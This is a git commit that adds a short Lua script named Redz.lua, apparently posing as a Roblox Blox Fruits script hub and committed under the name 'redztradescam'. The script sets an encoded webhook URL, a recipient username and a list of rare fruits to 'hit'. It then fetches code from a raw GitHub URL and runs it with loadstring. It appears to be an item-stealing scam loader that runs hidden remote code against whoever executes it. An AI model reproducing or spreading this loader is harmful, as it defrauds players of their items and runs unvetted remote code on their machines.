aa3aae17b3b036f444bde8a9ed958224daa98236
redztradescam <adakikpopo@gmail.com>
2025-03-28 09:51:35 +0100

    Create Redz.lua

---
+++ Redz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Z09RdGVRd3BXUGxudWFwVU9BYWpKdzpZaTg4eG5DQVB1anpSaGJOWHRBY2ZZWVUtZjBhbUJRRmc5ZXliYXZpTW9GNUxXVHAxMzdwcE1uQnhFWjE1SEpkN1Rla2NwY3E1WXZNQ3VaSTM2dzZob0FvX01tZDdicHhfbmprb2hIMnhuTmFmdzR3bmlqelpudTJDTWo4RGVrLUFnRHh3S3NYUThqQmpuNUo1R1BELXZUYnBFb1RfTFdlbkt1QmE0YW5aQjg"
+Usernames = {"igagagaga4"}
+FruitsToHit = {"Venom-Venom", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune", "Control-Control", "Dough-Dough", "Gravity-Gravity", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
